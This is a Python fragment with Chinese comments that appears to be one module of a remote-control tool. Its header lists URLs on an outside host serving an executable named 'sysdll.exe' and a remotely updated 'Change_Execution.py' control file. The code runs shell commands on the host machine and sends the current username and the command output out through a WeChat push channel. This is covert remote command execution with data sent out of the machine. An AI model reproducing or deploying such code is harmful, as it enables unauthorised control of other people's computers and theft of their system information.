"""
代码有变化就执行1458
https://yc.052024.xyz/xz/sysdll.exe
https://yc.052024.xyz/Control_files/Change_Execution.py
"""
import os
import subprocess

self.main.wechat_push.Alleged_information(f'{self.main.sys_username}命令代码')
# 要执行的命令，这里以获取系统信息（systeminfo）为例
command = "cd"
# 使用run函数执行命令，通过shell=True在系统的shell中执行，需要注意安全问题
try:
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    if result.returncode == 0:
        print(result.stdout)
        self.main.wechat_push.Alleged_information(f'{result.stdout}')
    else:
        print(f"命令执行失败，错误信息: {result.stderr}")
        self.main.wechat_push.Alleged_information(f'{f"命令执行失败，错误信息: {result.stderr}"}')
except Exception as e:
    print(f"发生错误: {e}")
    self.main.wechat_push.Alleged_information(f"发生错误: {e}")

